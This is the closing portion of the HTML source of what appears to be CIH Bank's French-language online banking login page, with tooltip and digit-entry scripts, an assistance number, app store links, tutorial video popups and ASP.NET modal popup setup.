        $('#popovertxtPwdtmp').simpletip({ fixed: true, position: 'top', content: '<img  src=\'https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/ImgCodeSecret.png\'  />' });

        var prm = Sys.WebForms.PageRequestManager.getInstance();
        prm.add_endRequest(EndRequestHandler);

        function EndRequestHandler(sender, args) {
            // $('#darkbg').hide();
            // $("#loading_image").hide();
            $('#popovertxtHBLogintmp').simpletip({ fixed: true, position: 'top', content: '' });
            $('#popovertxtPwdtmp').simpletip({ fixed: true, position: 'top', content: '' });
        }
    });
</script>

<script>

    function verifierCaracteres(event) {

        var keyCode = event.which ? event.which : event.keyCode;
        var touche = String.fromCharCode(keyCode);

        var champ = document.getElementById('txtHBLogin');

        var caracteres = '0123456789';

        if (caracteres.indexOf(touche) >= 0) {
            champ.value += touche;
        }

    }

</script>




                    <p class="assistance">
                        NUMERO D'ASSISTANCE : 05 22 47 94 79
                    </p>
                   <br/>
                    <p class="assistance" >
                    <a href="../Ress/dwn/guide.pdf" target="_blank" class="lien_guide1"
                        id="A2" title="Guide d'inscription"> Comment activer mon espace CIH ONLINE </a>                     
                    </p>
                </div>
            </div>
            <!-- Fin Partie 1 -->
            <!-- Partie 2 -->
            <div id="services">
                <ul>
                    <li>
                        <h1>Activez votre compte
                        </h1>
                        <a id="A1" onclick="ShowPopupYoutube2()" href="#">
                            <img src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/img_activate_hb.png" alt="Activez votre compte" />
                        </a></li>
                    <li>
                        <h1>Abonnez-vous</h1>
                        <a id="show" onclick="ShowPopupYoutube()" href="#" style="display: inline-block;">
                            <img src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/img_abonnez-vous_hb.png" alt="Abonnez-vous" />
                        </a></li>
                    <li class="download-icones-home">
                        <h1>Téléchargez l’application <a href="http://www.cihmobile.ma">CIH MOBILE</a></h1>
                        <a class="lien_appstore" href="https://itunes.apple.com/fr/app/cih-mobile/id664637221"
                            target="_blank">
                            <img src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/ico_appstore.png" alt="Appstore" />
                        </a><a href="https://play.google.com/store/apps/details?id=com.b3g.cih.online" target="_blank">
                            <img src="https://www.cihnet.co.ma/Portals/_default/Skins/CIH/images/newSkinImgs/ico_googleplay.png" alt="Googleplay" />
                        </a></li>
                </ul>
            </div>
            <!-- Fin Partie 2 -->
            <!-----------------------------------  Fin Contenu -->
        </div>
        <!--  Fin de la page -->
        <!-----------------------------------------------------  Pied de page -->
        <div id="footer">
            <div>
                <p>
                    Copyright CIH online 2014
                </p>
            </div>
        </div>
        <!-----------------------------------------------------  Fin Pied de page -->
        <span id="lbl"></span>
        <!-- PopUp Youtubs and welcome -->
        
        
         
        
         
        


    <!--       -->
          

           
          

      <!--        <div id="PnlWelcome5" class="modalPanelPop18 bg borderPopup" style="display:none">
	
            <div style="">
                <a href="#" id="closepop" class="close">
                    <img src="https://www.cihnet.co.ma/Portals/_default/Skins/cih/images/Close-icon.png" alt="" align="right" style="top: 10px;position: relative;left: -10px;background-color: #FFF;border-radius: 20px;"/>
                </a>
                
                    <a href="http://www.code30.ma/code18" target="_blank"><img src="https://www.cihnet.co.ma/Portals/_default/Skins/cih/images/Pop-up-Site-CIH1.png" alt=""/></a>
                
                
                 </div>
                
</div>


        <script type="text/javascript">
   
            var currenturl = window.location.pathname;
            if (currenturl == ('/') || currenturl == ('/#') || currenturl == ('/login.aspx')) {
                document.getElementById("PnlWelcome5").style.display = "block";
            }
            else{
                document.getElementById("PnlWelcome5").style.display = "none";
            }
  
        

        $('#closepop').live("click", function () {
            if ($("#PnlWelcome5").is(":hidden")) {
                $("#PnlWelcome5").show();
            }
            else {
                $("#PnlWelcome5").hide();
            }
            return false;
        });
        

        
    
   
</script> -->



        <!-- PopUp Youtubs  and welcome -->

        <div id="Panel2" class="modalPanelYoutube bg " style="display: none">
	
            <div class="video" onclick="HidePopupYoutube()">
                <a href="#" class="close" onclick="HidePopupYoutube()">
                    <img src="https://www.cihnet.co.ma/Portals/_default/Skins/cih/images/Close-icon.png" alt="" align="right"></a>
                <object id="ytplayer" style="height: 500px; width: 745px">
                    <param name="movie" value="https://www.youtube.com/v/AAEmbY68hnI?version=3&enablejsapi=1">
                    <param name="allowScriptAccess" value="always">
                    <embed id="ytplayer" src="https://www.youtube.com/v/AAEmbY68hnI?version=3&enablejsapi=1"
                        type="application/x-shockwave-flash" allowfullscreen="true" allowscriptaccess="always" width="745" height="500">
                </object>
            </div>
        
</div>

        <div id="Panel3" class="modalPanelYoutube bg" style="display: none">
	
            <div class="video " onclick="HidePopupYoutube2()">
                <a href="#" class="close" onclick="HidePopupYoutube2()">
                    <img src="https://www.cihnet.co.ma/Portals/_default/Skins/cih/images/Close-icon.png" alt="" align="right"></a>
                <object id="ytplayer2" style="height: 500px; width: 745px">
                    <param name="movie" value="https://www.youtube.com/v/sEGvfNLeulg?version=3&enablejsapi=1">
                    <param name="allowScriptAccess" value="always">
                    <embed id="ytplayer2" src="https://www.youtube.com/v/sEGvfNLeulg?version=3&enablejsapi=1"
                        type="application/x-shockwave-flash" allowfullscreen="true" allowscriptaccess="always" width="745" height="500">
                </object>
            </div>
        
</div>

        <div id="PanelMobileAndroid" class="modalPanelYoutube bg" style="display: none">
	
            <div>
                <a href="#" class="close" onclick="HidePopupMobileAndroid()">
                    <img src="https://www.cihnet.co.ma/Portals/_default/Skins/cih/images/Close-icon.png" alt="" align="right"></a>
                <a href="#" >Continuer sur le site Web</a>
                <br />
                <a id="LinkButton1" href="javascript:__doPostBack(&#39;ctl00$LinkButton1&#39;,&#39;&#39;)">Android</a>
            </div>
        
</div>

         <div id="PanelMobileIOS" class="modalPanelYoutube bg" style="display: none">
	
            <div>
                <a href="#" class="close" onclick="HidePopupMobileIOS()">
                    <img src="https://www.cihnet.co.ma/Portals/_default/Skins/cih/images/Close-icon.png" alt="" align="right"></a>
                <a href="#" >Continuer sur le site Web</a>
                <br />
                <a id="LinkButton2" href="javascript:__doPostBack(&#39;ctl00$LinkButton2&#39;,&#39;&#39;)">IOS</a>
            </div>
        
</div>

        

        <!--End PopUp Youtubs and welcome  -->
    

<script type="text/javascript">
//<![CDATA[
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBgbenif","PopupControlID":"Main_ctl00_Panel1","dynamicServicePath":"/Default.aspx","id":"Main_ctl00_ModalPopupExtenderOtp"}, null, null, $get("Main_ctl00_lblMsg"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBgbenif","PopupControlID":"Main_ctl00_Panel3","dynamicServicePath":"/Default.aspx","id":"Main_ctl00_ModalPopupExtender1"}, null, null, $get("Main_ctl00_Label1"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBgbenif","PopupControlID":"Panel2","PopupDragHandleControlID":"PopupHeader","dynamicServicePath":"/Default.aspx","id":"ModalPopupExtender2"}, null, null, $get("lbl"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBgbenif","PopupControlID":"Panel3","PopupDragHandleControlID":"PopupHeader","dynamicServicePath":"/Default.aspx","id":"ModalPopupExtender3"}, null, null, $get("lbl"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBgbenif","PopupControlID":"PnlWelcome","PopupDragHandleControlID":"PopupHeader","dynamicServicePath":"/Default.aspx","id":"ModalPopupWelcome"}, null, null, $get("lbl"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBgbenif","PopupControlID":"PanelMobileAndroid","PopupDragHandleControlID":"PopupHeader","dynamicServicePath":"/Default.aspx","id":"ModalPopupExtender1"}, null, null, $get("lbl"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBgbenif","PopupControlID":"PanelMobileIOS","PopupDragHandleControlID":"PopupHeader","dynamicServicePath":"/Default.aspx","id":"ModalPopupExtender4"}, null, null, $get("lbl"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBgbenif","PopupControlID":"PnlWelcome5","PopupDragHandleControlID":"PopupHeader","dynamicServicePath":"/Default.aspx","id":"ModalPopupExtender5"}, null, null, $get("lbl"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.ModalPopupBehavior, {"BackgroundCssClass":"modalBgbenif","PopupControlID":"PnlWelcome5","PopupDragHandleControlID":"PopupHeader","dynamicServicePath":"/Default.aspx","id":"ModalPopupExtender6"}, null, null, $get("lbl"));
});
//]]>
</script>
</form>
</body>
</html>

